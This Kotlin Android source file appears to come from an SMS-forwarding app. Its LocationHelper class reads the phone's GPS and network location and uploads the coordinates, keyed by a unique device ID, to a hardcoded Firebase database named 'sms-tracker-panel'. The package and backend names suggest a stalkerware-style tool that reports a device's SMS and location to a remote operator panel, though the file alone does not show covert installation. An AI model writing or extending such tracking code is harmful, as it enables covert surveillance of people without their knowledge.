package com.smsforwarder.utils

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Looper
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.firebase.database.FirebaseDatabase

class LocationHelper(private val context: Context) {

    private val deviceId = DeviceUtils.getUniqueDeviceId(context)

    companion object {
        private const val FIREBASE_URL = "https://sms-tracker-panel-default-rtdb.asia-southeast1.firebasedatabase.app/"
        private const val TAG = "LocationHelper"
    }

    fun fetchAndUploadLocation() {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "❌ Location permission not granted!")
            return
        }

        try {
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            
            // 1. Pehle Last Known Location try karein (Ye instantly mil jati hai)
            val lastKnownGps = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            val lastKnownNet = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            
            val bestLastLocation = if (lastKnownGps != null && lastKnownNet != null) {
                if (lastKnownGps.time > lastKnownNet.time) lastKnownGps else lastKnownNet
            } else {
                lastKnownGps ?: lastKnownNet
            }

            if (bestLastLocation != null) {
                Log.d(TAG, "✅ Last known location found")
                uploadLocationToFirebase(bestLastLocation)
            }

            // 2. Agar fresh location chahiye (Live GPS), toh request karein
            Log.d(TAG, "⏳ Requesting fresh location updates...")
            val locationListener = object : LocationListener {
                override fun onLocationChanged(location: Location) {
                    Log.d(TAG, "✅ Fresh location received: ${location.latitude}, ${location.longitude}")
                    uploadLocationToFirebase(location)
                    // Ek baar location mil jaye toh update band kar dein
                    locationManager.removeUpdates(this) 
                }
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
                @Deprecated("Deprecated in Java")
                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
            }

            // GPS aur Network dono se update maangein
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0L, 0f, locationListener, Looper.getMainLooper())
            }
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0L, 0f, locationListener, Looper.getMainLooper())
            }

            // 15 second baad updates band kar dein (taaki battery na khaye)
            android.os.Handler(Looper.getMainLooper()).postDelayed({
                locationManager.removeUpdates(locationListener)
            }, 15000)

        } catch (e: Exception) {
            Log.e(TAG, "❌ Location Error: ${e.message}")
        }
    }

    private fun uploadLocationToFirebase(location: Location) {
        val data = mapOf(
            "latitude" to location.latitude,
            "longitude" to location.longitude,
            "accuracy" to location.accuracy,
            "timestamp" to System.currentTimeMillis()
        )
        FirebaseDatabase.getInstance(FIREBASE_URL)
            .getReference("devices/$deviceId/location")
            .setValue(data)
            .addOnSuccessListener { Log.d(TAG, "✅ Location uploaded to Firebase") }
            .addOnFailureListener { e -> Log.e(TAG, "❌ Failed to upload location: ${e.message}") }
    }
}
